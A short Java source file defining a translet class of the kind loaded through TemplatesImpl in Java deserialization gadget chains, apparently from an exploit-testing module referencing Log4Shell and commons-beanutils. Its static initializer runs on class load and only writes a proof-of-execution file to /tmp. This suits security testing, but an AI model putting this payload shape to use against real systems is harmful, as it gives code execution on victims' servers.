import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.lang.management.ManagementFactory;

/** Benign TemplatesImpl oracle; no command or Framework-generated payload. */
public final class NativeTranslet extends AbstractTranslet {
  static {
    try {
      String proof = "native-beanutils:" + ManagementFactory.getRuntimeMXBean().getName() + "\n";
      Files.write(Paths.get("/tmp/module-target-log4shell-native-gadget"), proof.getBytes(StandardCharsets.UTF_8));
    } catch (Exception error) { throw new IllegalStateException(error); }
  }
  public NativeTranslet() { transletVersion = 101; }
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
